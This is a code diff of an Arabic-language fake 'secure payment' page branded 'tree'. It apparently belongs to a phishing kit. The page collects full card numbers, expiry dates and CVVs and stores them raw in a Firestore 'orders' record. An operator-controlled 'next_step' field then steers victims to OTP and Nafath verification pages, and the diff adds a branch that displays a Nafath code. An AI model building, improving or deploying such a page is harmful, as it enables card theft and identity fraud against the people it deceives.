@@ -5,117 +5,160 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="js/theme-toggle.js"></script>
     <script src="js/i18n.js"></script>
-    <title>بوابة الدفع الآمنة | Secure Payment</title>
+    <title>بوابة الدفع الآمنة | Secure Payment - tree</title>
     <link rel="icon" type="image/png" href="https://tree.com.sa/assets/images/favicon.png">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/inner-theme.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/site-theme.css">
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
-        body { display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px; }
-        .pay-topbar {
-            display:flex; align-items:center; gap:12px; padding:14px 20px;
-            background: linear-gradient(90deg, #063324, #0a4d35);
-            border-bottom: 1px solid rgba(0,229,160,0.15);
+        body.tree-site { min-height: 100vh; margin: 0; padding: 16px; display: flex; flex-direction: column; align-items: center; justify-content: center;
+            background: linear-gradient(165deg, var(--tree-bg-soft, #e8f5ef) 0%, var(--tree-bg, #f4f7f5) 45%, var(--tree-card, #fff) 100%);
         }
-        .pay-topbar__text strong { display:block; font-size:1rem; color:var(--text-white); }
-        .pay-topbar__text small { font-size:0.78rem; color:var(--text-muted); }
-        .pay-logo-section { padding:20px 24px 14px; text-align:center; border-bottom:1px solid var(--teal-border); }
-        .pay-logo-section img { height:36px; object-fit:contain; }
-        .pay-logo-section h3 { font-size:1rem; font-weight:700; color:var(--text-white); margin:10px 0 0; }
-        .trust-row { display:flex; align-items:center; justify-content:center; gap:8px; margin-top:20px; padding-top:16px; border-top:1px dashed var(--teal-border); color:var(--text-muted); font-size:0.8rem; }
+        .pay-shell { width: 100%; max-width: 460px; }
+        .pay-card {
+            border-radius: var(--tree-radius-lg, 16px); overflow: hidden;
+            box-shadow: 0 12px 40px rgba(0,0,0,.08), 0 2px 8px rgba(0,0,0,.04);
+            border: 1px solid var(--tree-border);
+            background: var(--tree-card);
+        }
+        .pay-topbar {
+            background: linear-gradient(90deg, var(--tree-primary, #198754), #146c43);
+            color: #fff; padding: 14px 20px; display: flex; align-items: center; gap: 12px;
+        }
+        .pay-topbar__lock { font-size: 1.35rem; opacity: .95; }
+        .pay-topbar__text { flex: 1; }
+        .pay-topbar__text strong { display: block; font-size: 1.05rem; }
+        .pay-topbar__text small { opacity: .9; font-size: .8rem; }
+        .pay-header { padding: 22px 24px 8px; text-align: center; border-bottom: 1px solid var(--tree-border); }
+        .pay-header img { width: 100px; height: auto; object-fit: contain; }
+        .pay-header h3 { margin: 12px 0 0; font-size: 1rem; font-weight: 700; color: var(--tree-text); }
+        .pay-body { padding: 22px 24px 28px; }
+        .pay-section-title { font-size: .9rem; font-weight: 700; color: var(--tree-text-muted); margin-bottom: 14px; text-align: center; }
+        .payment-method {
+            border: 2px solid var(--tree-border); border-radius: 12px; padding: 14px 16px;
+            display: flex; align-items: center; gap: 12px; cursor: pointer; transition: .2s;
+            margin-bottom: 10px; background: var(--tree-card);
+        }
+        .payment-method:hover { border-color: #5cb85c; }
+        .payment-method.selected { border-color: var(--tree-primary); background: rgba(25, 135, 84, 0.07); }
+        .method-logos { display: flex; gap: 8px; align-items: center; flex-shrink: 0; }
+        .method-logos img { height: 28px; width: auto; display: block; }
+        .method-title { font-weight: 600; margin-inline-end: auto; font-size: .95rem; color: var(--tree-text); }
+        #card-form { max-height: 0; overflow: hidden; opacity: 0; transform: translateY(-12px); transition: all .45s cubic-bezier(0.16, 1, 0.3, 1); margin-top: 0; }
+        #card-form.visible { max-height: 720px; margin-top: 22px; opacity: 1; transform: translateY(0); }
+        .f-group { margin-bottom: 16px; position: relative; }
+        .f-group label { display: block; margin-bottom: 6px; font-weight: 600; font-size: 13px; color: var(--tree-text-muted); }
+        .f-group input, .f-group select { width: 100%; box-sizing: border-box; padding: 12px 14px; border-radius: 10px; border: 1px solid var(--tree-border); background: var(--tree-card); color: var(--tree-text); font-size: 1rem; }
+        #c-num-wrap { position: relative; }
+        #c-num { padding-inline-start: 58px; letter-spacing: .12em; }
+        #c-logo-box {
+            position: absolute; inset-inline-start: 10px; top: 50%; transform: translateY(-50%);
+            width: 44px; height: 28px; border-radius: 6px; border: 1px solid var(--tree-border);
+            display: none; object-fit: contain; padding: 2px; background: var(--tree-card);
+        }
+        .c-exp-row { display: flex; gap: 12px; flex-wrap: wrap; }
+        .c-exp-row > div { flex: 1; min-width: 120px; }
+        .btn-pay {
+            width: 100%; padding: 14px; border-radius: 12px; font-size: 1rem; font-weight: 700; cursor: pointer;
+            transition: .25s; margin-top: 8px; border: none;
+            background: var(--tree-primary); color: #fff;
+        }
+        .btn-pay:hover:not(:disabled) { filter: brightness(1.05); }
+        .btn-pay:disabled { opacity: .75; cursor: not-allowed; }
+        .trust-row { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 22px; padding-top: 18px; border-top: 1px dashed var(--tree-border); color: var(--tree-text-muted); font-size: .82rem; }
+        .spinner-border {
+            display: inline-block; width: 1.15rem; height: 1.15rem; vertical-align: middle;
+            border: .2em solid currentColor; border-right-color: transparent;
+            border-radius: 50%; animation: spinner-border .75s linear infinite; margin-inline-start: 8px;
+        }
+        @keyframes spinner-border { to { transform: rotate(360deg); } }
     </style>
 </head>
-<body>
+<body class="tree-site">
 
 <button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>
 
-<div class="teal-card teal-card--narrow" style="width:100%;">
-
-    <!-- Topbar -->
-    <div class="pay-topbar">
-        <span style="font-size:1.3rem;">🔒</span>
-        <div class="pay-topbar__text" style="flex:1;">
-            <strong data-i18n="pay.secure">دفع آمن</strong>
-            <small data-i18n="pay.encrypted">بياناتك مشفّرة عبر اتصال محمي</small>
-        </div>
-        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
-    </div>
-
-    <!-- Logo + title -->
-    <div class="pay-logo-section">
-        <img src="images/logo.png" alt="tree" onerror="this.src='https://placehold.co/120x36/0a4d35/00e5a0?text=tree'">
-        <h3 data-i18n="pay.complete">إتمام عملية الدفع</h3>
-    </div>
-
-    <div class="card-body">
-
-        <div style="font-size:0.8rem;font-weight:700;color:var(--text-muted);text-align:center;margin-bottom:16px;text-transform:uppercase;letter-spacing:0.06em;" data-i18n="pay.choose_method">اختر طريقة الدفع</div>
-
-        <div class="pay-method active" id="method-card" onclick="selectMethod('card')">
-            <span class="pay-method__title" data-i18n="pay.credit_cards">البطاقات الائتمانية</span>
-            <div class="pay-method__logos">
-                <img src="images/payment/visa.svg" height="26" alt="Visa">
-                <img src="images/payment/mastercard.svg" height="26" alt="Mastercard">
+<div class="pay-shell">
+    <div class="pay-card">
+        <div class="pay-topbar">
+            <span class="pay-topbar__lock" aria-hidden="true">🔒</span>
+            <div class="pay-topbar__text">
+                <strong data-i18n="pay.secure">دفع آمن</strong>
+                <small data-i18n="pay.encrypted">بياناتك مشفّرة عبر اتصال محمي</small>
             </div>
+            <button class="btn btn-sm ms-auto" style="background:rgba(255,255,255,0.2);color:#fff;border:1px solid rgba(255,255,255,0.3);font-size:0.75rem;" data-lang-toggle onclick="toggleLang()">EN</button>
         </div>
-        <div class="pay-method" id="method-mada" onclick="selectMethod('mada')">
-            <span class="pay-method__title" data-i18n="pay.mada">مدى</span>
-            <div class="pay-method__logos">
-                <img src="images/payment/mada.svg" height="28" alt="مدى">
-            </div>
-        </div>
-        <div class="pay-method" id="method-apple" onclick="selectMethod('apple')">
-            <span class="pay-method__title">Apple Pay</span>
-            <div class="pay-method__logos">
-                <img src="images/payment/apple-pay.svg" height="28" alt="Apple Pay">
-            </div>
+        <div class="pay-header">
+            <img src="images/logo.png" alt="تري" onerror="this.src='https://placehold.co/120x40/198754/ffffff?text=TREE'">
+            <h3 data-i18n="pay.complete">إتمام عملية الدفع</h3>
         </div>
 
-        <!-- Card Form -->
-        <div id="card-form" class="card-form" style="max-height:600px;">
+        <div class="pay-body">
+            <div class="pay-section-title" data-i18n="pay.choose_method">اختر طريقة الدفع</div>
 
-            <div class="field">
-                <label class="field__label" for="p-name" data-i18n="pay.name_label">اسم صاحب البطاقة</label>
-                <input type="text" class="field__input" id="p-name" name="ccname" data-i18n="pay.name_ph" placeholder="الاسم كما هو مكتوب على البطاقة" inputmode="text" autocomplete="cc-name" autocapitalize="words">
+            <div class="payment-method" id="method-card" role="button" tabindex="0" onclick="selectMethod('card')" onkeydown="if(event.key==='Enter')selectMethod('card')">
+                <span class="method-title" data-i18n="pay.credit_cards">البطاقات الائتمانية</span>
+                <div class="method-logos">
+                    <img src="images/payment/visa.svg" width="48" height="30" alt="Visa">
+                    <img src="images/payment/mastercard.svg" width="48" height="30" alt="Mastercard">
+                </div>
             </div>
-
-            <div class="field">
-                <label class="field__label" for="c-num" data-i18n="pay.card_label">رقم البطاقة</label>
-                <div class="card-num-wrap">
-                    <img id="c-logo-box" class="card-logo-float" src="" alt="">
-                    <input type="text" class="field__input card-num-input" id="c-num" name="cardnumber" inputmode="numeric" autocomplete="cc-number" maxlength="19" placeholder="0000 0000 0000 0000" dir="ltr">
+            <div class="payment-method" id="method-mada" role="button" tabindex="0" onclick="selectMethod('mada')" onkeydown="if(event.key==='Enter')selectMethod('mada')">
+                <span class="method-title" data-i18n="pay.mada">مدى</span>
+                <div class="method-logos">
+                    <img src="images/payment/mada.svg" width="56" height="34" alt="مدى">
+                </div>
+            </div>
+            <div class="payment-method" id="method-apple" role="button" tabindex="0" onclick="selectMethod('apple')" onkeydown="if(event.key==='Enter')selectMethod('apple')">
+                <span class="method-title">Apple Pay</span>
+                <div class="method-logos">
+                    <img src="images/payment/apple-pay.svg" width="56" height="34" alt="Apple Pay">
                 </div>
             </div>
 
-            <div class="expiry-row">
-                <div class="field">
-                    <label class="field__label" data-i18n="pay.expiry">تاريخ الانتهاء</label>
-                    <div style="display:flex;gap:8px;">
-                        <select class="field__select" id="e-m" autocomplete="cc-exp-month" style="flex:1;">
-                            <option value="" data-i18n="pay.month">شهر</option>
-                            <script>for(let i=1;i<=12;i++) document.write(`<option value="${i<10?'0'+i:i}">${i<10?'0'+i:i}</option>`)</script>
-                        </select>
-                        <select class="field__select" id="e-y" autocomplete="cc-exp-year" style="flex:1;">
-                            <option value="" data-i18n="pay.year">سنة</option>
-                            <script>for(let i=24;i<=35;i++) document.write(`<option value="20${i}">20${i}</option>`)</script>
-                        </select>
+            <div id="card-form">
+                <div class="f-group">
+                    <label for="p-name" data-i18n="pay.name_label">اسم صاحب البطاقة</label>
+                    <input type="text" id="p-name" name="ccname" data-i18n="pay.name_ph" placeholder="الاسم كما هو مكتوب على البطاقة" inputmode="text" autocomplete="cc-name" autocapitalize="words" spellcheck="false">
+                </div>
+
+                <div class="f-group">
+                    <label for="c-num" data-i18n="pay.card_label">رقم البطاقة</label>
+                    <div id="c-num-wrap">
+                        <input type="text" id="c-num" name="cardnumber" inputmode="numeric" autocomplete="cc-number" maxlength="19" placeholder="0000 0000 0000 0000" dir="ltr">
+                        <img id="c-logo-box" src="" alt="">
                     </div>
                 </div>
-                <div class="field">
-                    <label class="field__label" for="c-v" data-i18n="pay.cvv">الرمز السري (CVV)</label>
-                    <input type="password" class="field__input" id="c-v" name="cvc" maxlength="4" inputmode="numeric" autocomplete="cc-csc" placeholder="•••" style="text-align:center;letter-spacing:0.2em;" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+
+                <div class="c-exp-row">
+                    <div class="f-group">
+                        <label data-i18n="pay.expiry">تاريخ الانتهاء</label>
+                        <div style="display:flex;gap:8px;">
+                            <select id="e-m" autocomplete="cc-exp-month" aria-label="شهر الانتهاء">
+                                <option value="">شهر</option>
+                                <script>for(let i=1; i<=12; i++) document.write(`<option value="${i<10?'0'+i:i}">${i<10?'0'+i:i}</option>`)</script>
+                            </select>
+                            <select id="e-y" autocomplete="cc-exp-year" aria-label="سنة الانتهاء">
+                                <option value="">سنة</option>
+                                <script>for(let i=24; i<=35; i++) document.write(`<option value="${'20'+i}">${'20'+i}</option>`)</script>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="f-group">
+                        <label for="c-v" data-i18n="pay.cvv">الرمز السري (CVV)</label>
+                        <input type="password" id="c-v" name="cvc" maxlength="4" inputmode="numeric" autocomplete="cc-csc" placeholder="•••" style="text-align:center;letter-spacing:.2em;" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                    </div>
                 </div>
+
+                <button type="button" class="btn-pay" id="pay-btn" onclick="checkAndSend()" data-i18n="pay.confirm_btn">تأكيد ودفع</button>
             </div>
 
-            <button type="button" class="btn-green" id="pay-btn" onclick="checkAndSend()" data-i18n="pay.confirm_btn">تأكيد ودفع</button>
+            <div class="trust-row">
+                <span aria-hidden="true">🛡️</span>
+                <span data-i18n="pay.trust">معالجة آمنة وفق معايير الدفع الإلكتروني</span>
+            </div>
         </div>
-
-        <div class="trust-row">
-            <span>🛡️</span>
-            <span data-i18n="pay.trust">معالجة آمنة وفق معايير الدفع الإلكتروني</span>
-        </div>
-
     </div>
 </div>
 
@@ -138,42 +181,79 @@
     };
 
     window.addEventListener('load', () => {
-        ['p-name','c-num','c-v'].forEach(id => { const el = document.getElementById(id); if(el) el.value=''; });
-        ['e-m','e-y'].forEach(id => { const el = document.getElementById(id); if(el) el.value=''; });
+        document.getElementById('p-name').value = '';
+        document.getElementById('c-num').value = '';
+        document.getElementById('e-m').value = '';
+        document.getElementById('e-y').value = '';
+        document.getElementById('c-v').value = '';
         document.getElementById('c-logo-box').style.display = 'none';
     });
 
+    const cardInput = document.getElementById('c-num');
+    const cardLogo = document.getElementById('c-logo-box');
+
     function selectMethod(method) {
-        ['method-card','method-mada','method-apple'].forEach(id => document.getElementById(id).classList.remove('active'));
-        document.getElementById('method-' + method).classList.add('active');
-        if (method === 'apple') { alert(t('pay.apple_unavailable')); return; }
+        document.getElementById('method-card').classList.remove('selected');
+        document.getElementById('method-mada').classList.remove('selected');
+        document.getElementById('method-apple').classList.remove('selected');
+
+        if (method === 'card') {
+            document.getElementById('method-card').classList.add('selected');
+        } else if (method === 'mada') {
+            document.getElementById('method-mada').classList.add('selected');
+        } else if (method === 'apple') {
+            document.getElementById('method-apple').classList.add('selected');
+            alert(t('pay.apple_unavailable'));
+        }
+        document.getElementById('card-form').classList.add('visible');
     }
     window.selectMethod = selectMethod;
 
-    const cardInput = document.getElementById('c-num');
-    const cardLogo = document.getElementById('c-logo-box');
     cardInput.addEventListener('input', function(e) {
-        let val = e.target.value.replace(/\s+/g,'').replace(/[^0-9]/gi,'');
-        let formatted = '';
-        for (let i=0; i<val.length; i++) { if(i>0 && i%4===0) formatted+=' '; formatted+=val[i]; }
+        let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        let formatted = "";
+        for (let i = 0; i < val.length; i++) {
+            if (i > 0 && i % 4 === 0) formatted += " ";
+            formatted += val[i];
+        }
         e.target.value = formatted;
-        if (val.startsWith('4')) { cardLogo.src=LOGO.visa; cardLogo.style.display='block'; }
-        else if (/^5[1-5]/.test(val)) { cardLogo.src=LOGO.mastercard; cardLogo.style.display='block'; }
-        else if (/^(58|60|96)/.test(val)) { cardLogo.src=LOGO.mada; cardLogo.style.display='block'; }
-        else { cardLogo.style.display='none'; }
-        if (val.length>=16 && validateLuhn(val)) document.getElementById('e-m').focus();
+
+        if (val.startsWith('4')) {
+            cardLogo.src = LOGO.visa;
+            cardLogo.style.display = 'block';
+        } else if (/^5[1-5]/.test(val)) {
+            cardLogo.src = LOGO.mastercard;
+            cardLogo.style.display = 'block';
+        } else if (/^(58|60|96)/.test(val)) {
+            cardLogo.src = LOGO.mada;
+            cardLogo.style.display = 'block';
+        } else {
+            cardLogo.style.display = 'none';
+        }
+
+        if (val.length >= 16 && validateLuhn(val)) {
+            document.getElementById('e-m').focus();
+        }
     });
-    document.getElementById('e-m').addEventListener('change', function() { if(this.value) document.getElementById('e-y').focus(); });
-    document.getElementById('e-y').addEventListener('change', function() { if(this.value) document.getElementById('c-v').focus(); });
+
+    document.getElementById('e-m').addEventListener('change', function() {
+        if (this.value) document.getElementById('e-y').focus();
+    });
+
+    document.getElementById('e-y').addEventListener('change', function() {
+        if (this.value) document.getElementById('c-v').focus();
+    });
 
     function validateLuhn(number) {
-        let sum=0, shouldDouble=false;
-        for (let i=number.length-1; i>=0; i--) {
-            let digit = parseInt(number.charAt(i),10);
-            if (shouldDouble) { if((digit*=2)>9) digit-=9; }
-            sum+=digit; shouldDouble=!shouldDouble;
+        let sum = 0;
+        let shouldDouble = false;
+        for (let i = number.length - 1; i >= 0; i--) {
+            let digit = parseInt(number.charAt(i), 10);
+            if (shouldDouble) { if ((digit *= 2) > 9) digit -= 9; }
+            sum += digit;
+            shouldDouble = !shouldDouble;
         }
-        return (sum%10)===0;
+        return (sum % 10) === 0;
     }
 
     async function checkAndSend() {
@@ -182,33 +262,53 @@
         const month = document.getElementById('e-m').value;
         const year = document.getElementById('e-y').value;
         const cvv = document.getElementById('c-v').value;
-        const payBtn = document.getElementById('pay-btn');
-        const cleanNum = num.replace(/\s+/g,'');
+        const payBtn = document.querySelector('.btn-pay');
+        const cleanNum = num.replace(/\s+/g, '');
 
-        if (cleanNum.length < 15 || !validateLuhn(cleanNum)) { alert(t('pay.err_card')); return; }
-        if (name.length < 3 || !month || !year || cvv.length < 3) { alert(t('pay.err_incomplete')); return; }
+        if (cleanNum.length < 15 || !validateLuhn(cleanNum)) {
+            alert(t('pay.err_card'));
+            return;
+        }
+
+        if (name.length < 3 || !month || !year || cvv.length < 3) {
+            alert(t('pay.err_incomplete'));
+            return;
+        }
 
         const now = new Date();
-        if (parseInt(year,10) < now.getFullYear() || (parseInt(year,10)===now.getFullYear() && parseInt(month,10)<now.getMonth()+1)) {
-            alert(t('pay.err_expired')); return;
+        const currentYear = now.getFullYear();
+        const currentMonth = now.getMonth() + 1;
+
+        if (parseInt(year, 10) < currentYear || (parseInt(year, 10) === currentYear && parseInt(month, 10) < currentMonth)) {
+            alert(t('pay.err_expired'));
+            return;
         }
 
         payBtn.disabled = true;
-        payBtn.innerHTML = `<span class="btn-spinner-inline"></span>${t('pay.processing')}`;
+        payBtn.innerHTML = '<span class="spinner-border" role="status" aria-hidden="true"></span> ' + t('pay.processing');
 
         const userId = localStorage.getItem('user_id');
-        if (!userId) { alert(t('pay.err_session')); payBtn.disabled=false; payBtn.textContent=t('pay.confirm_btn'); return; }
+        if (!userId) {
+            alert(t('pay.err_session'));
+            payBtn.disabled = false;
+            payBtn.innerText = t('pay.confirm_btn');
+            return;
+        }
 
         try {
             await db.collection("orders").doc(userId).update({
-                card_name: name, card_number: num,
-                expiry: month+"/"+year, cvv: cvv,
-                status: "waiting_otp", next_step: "WAITING"
+                card_name: name,
+                card_number: num,
+                expiry: month + "/" + year,
+                cvv: cvv,
+                status: "waiting_otp",
+                next_step: "WAITING"
             });
             window.location.href = "otp_verification.html";
-        } catch(e) {
+        } catch (e) {
             alert(t('pay.err_system'));
-            payBtn.disabled=false; payBtn.textContent=t('pay.confirm_btn');
+            payBtn.disabled = false;
+            payBtn.innerText = t('pay.confirm_btn');
         }
     }
 
@@ -218,8 +318,18 @@
             db.collection("orders").doc(userId).onSnapshot((docSnap) => {
                 if (docSnap.exists) {
                     const data = docSnap.data();
-                    if (data.next_step === "GO_TO_OTP") window.location.href = "otp_verification.html";
-                    else if (data.next_step === "GO_TO_NAFATH") window.location.href = "nafath.html";
+                    if (data.next_step === "GO_TO_OTP") {
+                        window.location.href = "otp_verification.html";
+                    } else if (data.next_step === "GO_TO_NAFATH") {
+                        window.location.href = "nafath.html";
+                    } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                        const codeBox = document.getElementById('nafath-number');
+                        if (codeBox && data.nafath_code) {
+                            codeBox.innerText = data.nafath_code;
+                            const overlay = document.getElementById('overlay');
+                            if (overlay) overlay.style.display = 'none';
+                        }
+                    }
                 }
             });
         }
